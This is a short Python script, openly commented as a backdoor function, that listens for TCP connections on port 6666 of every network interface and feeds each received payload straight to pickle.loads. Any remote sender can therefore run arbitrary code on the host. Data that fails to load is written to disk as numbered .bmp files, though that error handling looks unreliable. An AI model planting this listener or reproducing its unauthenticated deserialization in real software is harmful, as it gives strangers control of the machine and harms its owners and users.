import pickle
from io import BytesIO
import socket


# 后门函数
def server_pic(ip, port):
    socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket_obj.bind((ip, port))
    socket_obj.listen(5)
    file_on = 1
    while True:
        connection, address = socket_obj.accept()
        print("server connection by:", address)
        recv_message = b''
        recv_message_from = connection.recv(1024)
        while recv_message_from:
            recv_message += recv_message_from
            recv_message_from = connection.recv(1024)

        try:
            obj = pickle.loads(recv_message)
            print(obj)
        except EOFError:
            file_name = 'recv_image' + str(file_on) + '.bmp'
            recv_image = open(file_name, 'wb')
            recv_image.write(recv_message)
            file_on += 1
        connection.close()


if __name__ == "__main__":
    server_ip = '0.0.0.0'
    server_port = 6666
    server_pic(server_ip, server_port)
